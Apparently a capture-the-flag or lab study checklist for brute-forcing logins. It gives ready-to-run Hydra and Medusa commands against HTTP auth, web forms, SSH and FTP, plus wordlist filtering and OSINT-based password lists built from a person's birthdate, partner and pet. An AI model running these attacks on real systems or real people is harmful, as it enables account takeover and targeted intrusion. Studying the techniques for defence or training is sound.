# Login Brute Forcing Checklist

**Rule:** Enumerate before attacking. Read the form, identify the auth type, pick the right tool and wordlist, then attack.

---

## Reconnaissance
- [ ] `curl -s http://<TARGET>/` — read the page, identify auth type
- [ ] Inspect form HTML: method (GET/POST), action path, field names
- [ ] Identify failure string (e.g. "Invalid credentials") OR success condition (302, "Dashboard")
- [ ] Check for default credentials first — `admin:admin`, `admin:password`, `root:toor`
- [ ] If targeting a person: run Username Anarchy + CUPP before attacking

---

## Wordlist Prep
- [ ] Choose appropriate wordlist for the scenario (see table below)
- [ ] If password policy is known: filter wordlist with grep chain
- [ ] Check filtered list size: `wc -l filtered.txt` — smaller = faster attack

### Wordlist Quick Reference
| Need | Wordlist |
|------|---------|
| Fast password attack | `2023-200_most_used_passwords.txt` |
| Thorough password attack | `rockyou.txt` |
| Default device creds | `Default-Credentials/default-passwords.txt` |
| Quick username list | `top-usernames-shortlist.txt` |
| Thorough username list | `xato-net-10-million-usernames.txt` |

### Policy Filter (chain as needed)
```bash
grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '[!@#$%^&*]' > filtered.txt
```

---

## Basic HTTP Authentication (Hydra)
- [ ] `hydra -l <user> -P <wordlist> <TARGET> http-get / -s <PORT>`
- [ ] After finding creds: `curl -s -u user:pass http://<TARGET>:<PORT>/`

---

## Web Login Form (Hydra http-post-form)
- [ ] Confirm: path, field names, failure/success string
- [ ] `hydra -L users.txt -P passwords.txt <TARGET> -s <PORT> -f http-post-form "/<path>:user=^USER^&pass=^PASS^:F=<fail_string>"`
- [ ] After finding creds: POST with `--data-urlencode` → save `-c cookies.txt` → GET `/success` with `-b cookies.txt`
- [ ] Watch for special chars in password — always use `--data-urlencode` with single quotes

---

## SSH (Medusa)
- [ ] `medusa -h <IP> -n <PORT> -u <user> -P <wordlist> -M ssh -t 3`
- [ ] Connect: `ssh user@<IP> -p <PORT>`
- [ ] Once inside: `netstat -tulpn | grep LISTEN` → `nmap localhost` to find internal services

---

## FTP (Medusa — from inside SSH)
- [ ] Check `/home` for username hints
- [ ] Download wordlist on remote box: `wget -q <url>`
- [ ] `medusa -h 127.0.0.1 -u <ftpuser> -P <wordlist> -M ftp -t 5`
- [ ] Connect: `ftp ftp://user:pass@127.0.0.1`
- [ ] `get flag.txt` → `exit` → `cat flag.txt`

---

## Custom Wordlists (targeted person)
- [ ] `./username-anarchy "First" "Last" > usernames.txt`
- [ ] `cupp -i` → enter OSINT data (name, birthdate, partner, pet, company, keywords)
- [ ] Filter output to match policy: `grep -E '^.{6,}$' name.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > filtered.txt`
- [ ] Run Hydra with both lists

---

## Universal Reminders
- [ ] Read the form HTML before building any Hydra command
- [ ] Use `--data-urlencode` with single quotes for passwords containing special chars
- [ ] Web login → save session cookie with `-c`, use with `-b`
- [ ] Medusa FTP → use `127.0.0.1` not `localhost`
- [ ] Wordlist not on remote box → `wget` it first
- [ ] Always check `/home` after SSH access for username hints
